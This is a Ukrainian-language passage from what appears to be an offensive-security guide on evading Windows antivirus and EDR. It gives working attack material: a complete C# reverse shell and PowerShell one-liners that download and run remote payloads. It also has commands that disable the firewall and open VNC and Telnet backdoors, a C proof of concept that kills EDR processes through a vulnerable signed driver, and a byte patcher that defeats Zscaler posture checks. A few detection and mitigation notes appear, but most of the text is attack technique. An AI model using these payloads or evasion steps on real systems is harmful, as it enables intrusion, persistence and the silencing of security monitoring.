Замість того, щоб маскувати весь implant лише під час простою, модифікований бекенд LLVM X86 може тримати вибрані функції XOR-маскованими, коли вони неактивні. PoC Function Peekaboo вибирає демангльовані назви, що містять `REG_`, вставляє position-independent заглушки входу/виходу навколо фінального машинного коду й додає один спільний обробник маскування до `.text`; сигнатури на рівні вихідного коду та угода про виклики Windows x64 залишаються незмінними.<sup>[[38]](#references)[[39]](#references)</sup>

#### Перетворення потоку керування в бекенді

Це слід робити після вибору інструкцій та оптимізації, оскільки перетворення має охоплювати **кожен згенерований return** і враховувати точне розташування інструкцій x86. `MachineFunctionPass`, що виконується перед генерацією коду, знаходить останню `MachineInstr::isReturn()`, видаляє її, щоб останній шлях переходив до доданого епілогу, а попередні return замінює на `JMP_1 handler`. Залишайте будь-яке згенероване компілятором очищення стека/кадру перед кожним return; перенаправляйте лише саму інструкцію return.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` і `emitFunctionBodyEnd()` генерують заглушки для кожної функції, а `emitEndOfAsmFile()` — обробник. Символи, спільні для етапів генерації, дають змогу переходу в прологу вказувати на пізніше розташований епілог; для вручну згенерованого near `je` запишіть `0F 84`, а потім чотирибайтовий MC-вираз `target - address_after_je`. Натомість виклики та переходи до обробника можна згенерувати як об’єкти `MCInst` (`CALL64pcrel32` і `JMP_1`). Якщо для функції нічого не змінено, pass має повертати `false`; у PoC на цьому шляху помилково повертається `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Метадані та ініціалізація до CRT

PoC розміщує ключ XOR і 16-байтові записи, що містять переміщений завантажувачем вказівник на функцію та довжину під час виконання, у `.funcmeta`. Хоча поле C має тип `uint32_t`, обробник зчитує QWORD зі зміщення `+8` у записі, використовуючи довжину та її вирівнювання, і переходить до наступного запису з кроком `0x10`. Назви секцій PE мають довжину лише вісім байтів, тому під час пошуку в пам’яті використовується `.funcmet`. Зовнішній патчер додає виконувану секцію `.stub`, зберігає старий RVA точки входу в заглушці й перенаправляє `AddressOfEntryPoint`; PIC-заглушка отримує базу образу через `gs:[0x60]` → `[PEB+0x10]`, проходить таблицю імпортів PE32+, щоб знайти вже імпортовану `VirtualProtect`, і виконується до CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Під час ініціалізації в `gs:[0xE8]` встановлюється sentinel і викликається кожна функція з метаданих. Її пролог, який завжди залишається читабельним, записує початок функції в `gs:[0xF0]`, перевіряє sentinel і пропускає тіло, яке ще не замасковане. Потім епілог виконує `call handler`; після того як обробник зберігає 13 регістрів (`0x68` байтів), адреса повернення в `[rsp+0x68]` є кінцем перетвореної функції, тож `end - start` можна записати в її запис метаданих. Після маскування всіх тіл заглушка очищає sentinel і переходить до `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Під час звичайного виклику пролог викликає той самий симетричний обробник, щоб декодувати тіло. Останній шлях переходить до доданого епілогу, а всі попередні return переходять безпосередньо до спільного обробника. Звичайний епілог також використовує `jmp handler`, а не `call`, тож після повторного маскування `ret` обробника споживає адресу повернення початкового виклику та зберігає результат функції в `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Примітив маскування та індикатори аналізу

Обробник знаходить поточний запис, пропускає фіксований видимий пролог (у цій збірці — `0x46` байтів), змінює захист решти пам’яті на `PAGE_EXECUTE_READWRITE`, виконує побайтовий XOR із молодшим байтом ключа, а потім встановлює `PAGE_EXECUTE_READ`. Таким чином, той самий цикл декодує тіло під час входу та кодує його під час кожного звичайного виходу.<sup>[[38]](#references)[[39]](#references)</sup>

До високоточних індикаторів цієї схеми належать:<sup>[[38]](#references)[[39]](#references)</sup>

- точка входу всередині виконуваної секції `.stub` і секція `.funcmet`, що містить ключ та переміщені вказівники на `.text`;
- парсинг PEB, таблиці імпортів і таблиці секцій до CRT, а потім виклики через кожен вказівник із метаданих;
- однакові PIC-прологи `call`/`pop` і численні точки повернення, перенаправлені до одного обробника;
- записи в `gs:[0xE8]`, `gs:[0xF0]` і `gs:[0xF8]`, за якими йдуть повторювані зміни захисту через `VirtualProtect` та побайтові записи XOR у виконувані сторінки, прив’язані до образу.

Це ухилення від сканерів пам’яті, а не криптографічний захист: пропатчений файл усе ще містить початкове незашифроване тіло, а в налагоджувачі можна встановити breakpoint на `VirtualProtect` або цикл XOR і зняти дамп активної функції. Однобайтовий XOR, читабельні метадані та фіксована межа `0x46` також спрощують відновлення офлайн.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Слоти TEB у PoC локальні для потоку, але змінені сторінки коду є спільними для всього процесу. Тому одночасний або рекурсивний вхід може повторно перемикати інструкції, поки виконується інший виклик; винятки та нелокальні виходи також можуть обійти повторне маскування. Надійна реалізація має синхронізувати переходи, відновлювати фактичний захист, отриманий через `lpflOldProtect`, уникати жорстко заданої довжини заглушки, перевіряти вирівнювання стека x64 на шляхах `call` і `jmp`, а також викликати `FlushInstructionCache` після перезапису виконуваних байтів. Microsoft прямо покладає на викликач відповідальність за узгодженість кешу інструкцій під час зміни виконуваного коду.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen і MoTW

Можливо, ви бачили це вікно під час завантаження з інтернету та запуску деяких виконуваних файлів.

Microsoft Defender SmartScreen — це механізм безпеки, покликаний захищати кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно використовує підхід на основі репутації: маловідомі застосунки, завантажені з інтернету, викликають спрацювання SmartScreen, який попереджає кінцевого користувача та не дає запустити файл (хоча його все одно можна запустити, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [альтернативний потік даних NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету разом із URL-адресою, звідки їх було завантажено.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка ADS Zone.Identifier для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не викликають спрацювання SmartScreen**.

Дуже ефективний спосіб не допустити встановлення Mark of The Web на ваші payloads — запакувати їх у контейнер, наприклад ISO. Це працює тому, що Mark-of-the-Web (MOTW) **не можна** застосувати до томів, які **не використовують NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це інструмент для пакування payloads у вихідні контейнери з метою обходу Mark-of-the-Web.

Приклад використання:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ось демонстрація обходу SmartScreen за допомогою пакування payloads в ISO-файли через [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм журналювання у Windows, який дає змогу застосункам і системним компонентам **записувати події**. Водночас його можуть використовувати засоби безпеки для моніторингу та виявлення шкідливої активності.

Так само, як можна вимкнути (обійти) AMSI, можна також змусити функцію **`EtwEventWrite`** процесу в user space негайно повертатися, не записуючи подій. Для цього функцію патчать у пам’яті, щоб вона відразу поверталася, фактично вимикаючи журналювання ETW для цього процесу.

Детальніше можна дізнатися тут: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) і [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Завантаження C# бінарних файлів у пам’ять відоме вже досить давно й досі є чудовим способом запускати інструменти post-exploitation, не потрапляючи на очі AV.

Оскільки payload завантажується безпосередньо в пам’ять, не торкаючись диска, нам потрібно буде лише подбати про патчинг AMSI для всього процесу.

Більшість C2-фреймворків (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже дають змогу виконувати C# assemblies безпосередньо в пам’яті, але для цього є різні способи:

- **Fork\&Run**

Цей спосіб передбачає **створення нового sacrificial process**, ін’єкцію в нього шкідливого коду post-exploitation, виконання цього коду й завершення нового процесу після закінчення. У цього способу є переваги й недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **поза** процесом нашого Beacon implant. Це означає, що якщо під час дії post-exploitation щось піде не так або її виявлять, **імовірність збереження нашого implant значно вища**. Недолік — **більша ймовірність** виявлення засобами **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Цей спосіб передбачає ін’єкцію шкідливого коду post-exploitation **у власний процес**. Так можна уникнути створення нового процесу та його сканування AV, але якщо під час виконання payload щось піде не так, **імовірність втратити beacon значно вища**, оскільки він може аварійно завершитися.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Щоб дізнатися більше про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Також можна завантажувати C# Assemblies **із PowerShell**. Перегляньте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можна виконувати шкідливий код іншими мовами, надавши скомпрометованій машині доступ **до середовища інтерпретатора, розміщеного на SMB-шарі під контролем зловмисника**.

Надавши доступ до бінарних файлів інтерпретатора й середовища на SMB-шарі, можна **виконувати довільний код цими мовами в пам’яті** скомпрометованої машини.

У репозиторії зазначено: Defender і далі сканує скрипти, але використання Go, Java, PHP тощо дає **більше можливостей для обходу статичних сигнатур**. Тестування випадкових необфускованих reverse shell скриптів цими мовами виявилося успішним.

## TokenStomping

Token stomping змінює access token засобу безпеки, наприклад EDR або AV. Зниження привілеїв токена може залишити процес запущеним, але завадити йому виконувати привілейовану перевірку чи усунення загроз.

Щоб запобігти цьому, Windows може **заборонити зовнішнім процесам** отримувати handles токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного ПЗ

### Chrome Remote Desktop

Як описано в [**цій публікації в блозі**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), Chrome Remote Desktop легко розгорнути на ПК жертви, а потім використовувати для отримання контролю над ним і підтримання persistence:<sup>[[35]](#references)</sup>
1. Завантажте його з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім клацніть MSI-файл для Windows, щоб завантажити його.
2. Запустіть інсталятор у тихому режимі на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть Next. Майстер запропонує пройти авторизацію; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте надану команду з необхідними змінами: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` встановлює PIN без використання GUI).
 

## Просунута техніка ухилення

Ухилення — дуже складна тема. Іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тому в зрілих середовищах залишатися повністю непоміченим практично неможливо.

У кожного середовища, з яким ви зіткнетеся, будуть свої сильні й слабкі сторони.

Дуже раджу переглянути цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб ознайомитися з просунутими техніками ухилення.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це ще одна чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про багаторівневе ухилення.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Застарілі техніки**

### **Перевірка, які частини Defender вважає шкідливими**

За допомогою [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) можна **видаляти частини бінарного файлу**, доки він **не визначить, яку саме частину Defender** вважає шкідливою, і не виокремить її.\
Інший інструмент, який робить **те саме, —** [**avred**](https://github.com/dobin/avred); він пропонує цю послугу у відкритому вебінтерфейсі за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі версії Windows постачалися з **Telnet server**, який можна було встановити (від імені адміністратора), виконавши:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Зробіть так, щоб він **запускався** під час запуску системи, і **запустіть** його зараз:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Змінити порт telnet** (stealth) і вимкнути firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Завантажте його звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні завантаження bin, а не інсталятор)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть параметр _Disable TrayIcon_
- Установіть пароль у _VNC Password_
- Установіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **компрометований комп’ютер**

#### **Зворотне підключення**

**Зловмисник** має **запустити на своєму** **хості** бінарний файл `vncviewer.exe -listen 5900`, щоб бути **готовим** прийняти зворотне **VNC-з’єднання**. Потім на **компрометованому комп’ютері** запустіть демон winvnc командою `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**УВАГА:** Щоб зберегти непомітність, не можна робити кілька речей

- Не запускайте `winvnc`, якщо він уже працює, інакше з’явиться [спливаюче вікно](https://i.imgur.com/1SROTTl.png). Перевірте, чи він працює, командою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без файлу `UltraVNC.ini` у тій самій директорії, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h`, щоб переглянути довідку, інакше з’явиться [спливаюче вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте його звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Усередині GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Поточний Defender дуже швидко завершить процес.**

### Компілюємо власний reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# reverse shell

Скомпілюйте його за допомогою:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Використовуйте це з:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# із використанням компілятора

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Приклад використання Python для створення інжекторів:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – знищення AV/EDR із простору ядра

Storm-2603 використовувала невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути захист кінцевих точок перед розгортанням ransomware. Інструмент постачається **із власним уразливим, але *підписаним* драйвером** і зловживає ним для виконання привілейованих операцій ядра, які не можуть заблокувати навіть AV-служби Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Основні висновки
1. **Підписаний драйвер**: файл, який записується на диск, — це `ServiceMouse.sys`, але фактично це легітимно підписаний драйвер `AToolsKrnl64.sys` із «System In-Depth Analysis Toolkit» від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується, навіть коли ввімкнено Driver-Signature-Enforcement (DSE).
2. **Встановлення служби**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Перший рядок реєструє драйвер як **службу ядра**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним із простору користувача.
3. **IOCTL-коди, які надає драйвер**
   | IOCTL-код | Можливість                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Завершити довільний процес за PID (використовується для завершення служб Defender/EDR) |
   | `0x990000D0` | Видалити довільний файл із диска |
   | `0x990001D0` | Вивантажити драйвер і видалити службу |

   Мінімальний proof-of-concept на C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Чому це працює**: BYOVD повністю обходить захисти в user-mode; код, що виконується в kernel, може відкривати *захищені* процеси, завершувати їх або втручатися в об’єкти kernel незалежно від PPL/PP, ELAM чи інших функцій посилення захисту.

Виявлення / пом’якшення
• Увімкніть список заблокованих вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
• Відстежуйте створення нових служб *kernel* і сповіщайте про завантаження драйвера з каталогу, доступного для запису всім користувачам, або драйвера, якого немає в списку дозволених.
• Відстежуйте дескриптори user-mode для спеціальних об’єктів пристроїв, після яких виконуються підозрілі виклики `DeviceIoControl`.

### Обхід перевірок стану пристрою Zscaler Client Connector за допомогою виправлення двійкових файлів на диску

**Client Connector** від Zscaler локально застосовує правила стану пристрою та використовує Windows RPC для передавання результатів іншим компонентам. Обійти захист повністю можна через два слабкі рішення в архітектурі:

1. Перевірка стану пристрою відбувається **виключно на стороні клієнта** (на сервер надсилається булеве значення).
2. Внутрішні кінцеві точки RPC перевіряють лише те, чи **підписаний під’єднаний виконуваний файл Zscaler** (за допомогою `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Виправленням чотирьох підписаних двійкових файлів на диску** можна нейтралізувати обидва механізми:

| Двійковий файл | Вихідна логіка, яку виправлено | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка проходить успішно |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | Замінено на NOP ⇒ будь-який процес (навіть непідписаний) може під’єднатися до каналів RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Передчасно завершуються |

Мінімальний фрагмент patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Після заміни оригінальних файлів і перезапуску стека служб:

* **Усі** перевірки стану системи відображають зелені позначки/відповідність вимогам.
* Непідписані або модифіковані бінарні файли можуть відкривати кінцеві точки RPC іменованих каналів (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей приклад демонструє, як можна обійти суто клієнтські рішення щодо довіри та прості перевірки підпису за допомогою кількох байтових патчів.

## Microsoft Defender `BTR.sys`: зловживання довіреною функціональністю

Драйвер Defender **Boot-Time Removal** — корисний контрприклад класичному BYOVD. `BTR.sys` — легітимний підписаний Microsoft компонент для усунення загроз, у якому немає помилки пошкодження пам’яті чи інтерфейсу IOCTL; натомість, отримавши права адміністратора та `SeLoadDriverPrivilege`, оператор може підробити приватну транзакцію усунення загроз і виконати передбачені операції з файлами/реєстром на рівні Ring-0. Це **примітив нейтралізації AV/EDR після компрометації, а не початкового доступу чи підвищення привілеїв**. Драйвер можна витягти з ресурсу `BOOTTIMETOOL` у власному `MpEngine.dll` цільової системи, не імпортуючи помітний сторонній драйвер.<sup>[[36]](#references)</sup>

### Підготовка одноразового драйвера

Зазвичай Defender записує ресурс у файл із випадковою назвою `[a-z]{8}.sys` і реєструє службу ядра з подібною назвою. `DriverEntry` читає значення `Args` служби, відкриває вказаний альтернативний потік даних NTFS (ADS), розшифровує та перевіряє список дій, записує дані зворотного зв’язку й після успішного виконання повертає `0xC0000056` (`STATUS_DELETE_PENDING`), щоб вивантажити драйвер, а не залишати його резидентним. Підроблена служба має такі характерні значення.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Потік `:changelist` містить один blob, зашифрований RC4. В аналізованих збірках повторно використовується фіксований 256-байтовий ключ, тому шифрування не є межею авторизації. Коректний відкритий текст містить 24-байтовий глобальний заголовок (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC заголовка та ідентифікатор транзакції, похідний від payload), за яким ідуть шлях зворотного зв’язку в UTF-16 із нульовим термінатором і довільна кількість елементів. Кожен елемент має 16-байтовий заголовок (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) і дані, специфічні для дії, що закінчуються **рівно чотирма нульовими байтами**. Кожна область заголовка/даних перевіряється окремо за допомогою CRC-32 з поліномом `0xEDB88320`, початковим станом `0xFFFFFFFF` і **без фінального XOR** (`~CRC32`); стан CRC скидається для кожної області.<sup>[[36]](#references)[[37]](#references)</sup>

Прийняті ID дій відкривають доступ до таких примітивів ядра.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Дані елемента | Результат |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Видалення файлу, зокрема заблокованого |
| 2 | `[UTF-16 path]` | Видалення порожнього каталогу |
| 3 | `[Flags][source][destination]` | Переміщення файлу до захищеного шляху, вибраного зловмисником; порожнє значення destination означає видалення |
| 4 | `[Flags][key path]` | Рекурсивне видалення розділу реєстру |
| 5 | `[Flags][key path + "\\" + value]` | Видалення значення реєстру |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Створення/оновлення значення реєстру та створення відсутніх шляхів до розділів |

